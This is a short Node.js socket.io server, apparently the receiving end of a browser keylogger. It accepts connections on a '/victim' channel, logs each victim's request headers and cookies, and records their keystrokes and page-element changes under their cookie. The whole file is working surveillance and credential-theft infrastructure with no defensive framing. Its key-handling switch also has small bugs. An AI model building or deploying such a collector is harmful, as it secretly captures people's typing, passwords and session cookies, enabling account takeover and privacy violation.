var path = require('path')
var express = require('express')
var app = express()
var server = require('http').Server(app)
var io = require('socket.io')(server)
var victim

app.use(express.static('.'));

victim = io
   .of('/victim')
   .on('connection', function(socket){

	console.log('victim connected');
	
	var acceptHeader = socket.handshake.headers
	console.log(acceptHeader)

	socket.on('update', function(change){

	   switch(change.type){
		case 'type':
		   charCode = String.fromCharCode(change.msg)
		    console.log(acceptHeader.cookie+ ' : ' + charCode)
			switch(change.type){
			case 8: //backspace
	 		console.log(acceptHeader.cookie+ ' : *backspace*')
			break;
			case 13: //space
	 		console.log(acceptHeader.cookie+ ' : *space*')
			break;
			case 32: //new line
	 		console.log(acceptHeader.cookie+ ' : *newline*')
			break;
		   	}
	 	break;
		case 'element-change':
		   console.log(acceptHeader.cookie+ ' change to: '+ change.msg)
		break;
		}
        });

	socket.on('disconnect', function(){
	   console.log('victim disconnected');
	});
   });

server.listen(3000, function(){
   console.log('listening on :3000');
});
